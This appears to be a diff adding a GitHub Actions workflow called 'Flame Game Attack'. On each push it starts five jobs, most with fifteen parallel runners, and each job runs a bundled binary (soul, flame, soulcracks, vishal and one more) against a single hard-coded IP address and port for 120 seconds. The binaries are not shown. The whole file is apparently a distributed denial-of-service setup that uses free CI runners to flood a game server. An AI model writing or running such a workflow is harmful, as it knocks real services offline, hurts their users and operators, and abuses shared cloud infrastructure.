@@ -1,0 +1,67 @@
+name: Flame Game Attack
+on: [push]
+
+jobs:
+  soul_attack:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,
+            11,12,13,14,15]
+    steps:
+    - uses: actions/checkout@v3
+    - name: Make soul executable and run attack
+      run: |
+        chmod +x soul
+        ./soul 20.204.88.88 14682 120
+
+  flame_attack:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,
+            11,12,13,14,15]
+    steps:
+    - uses: actions/checkout@v3
+    - name: Make flame executable and run attack
+      run: |
+        chmod +x flame
+        ./flame 20.204.88.88 14682 120
+
+  soulcracks_attack:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [999]
+    steps:
+    - uses: actions/checkout@v3
+    - name: Make soulcracks executable and run attack
+      run: |
+        chmod +x soulcracks
+        ./soulcracks 20.204.88.88 14682 120 ${{ matrix.n }}
+
+  vishal_attack:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10,
+            11,12,13,14,15]
+    steps:
+    - uses: actions/checkout@v3
+    - name: Make vishal executable and run attack
+      run: |
+        chmod +x vishal
+        ./vishal 20.204.88.88 14682 120
+
+  fuck_attack:
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1400]
+    steps:
+    - uses: actions/checkout@v3
+    - name: Make fuck executable and run attack
+      run: |
+        chmod +x fuck
+        ./fuck 20.204.88.88 14682 120 ${{ matrix.n }}
+
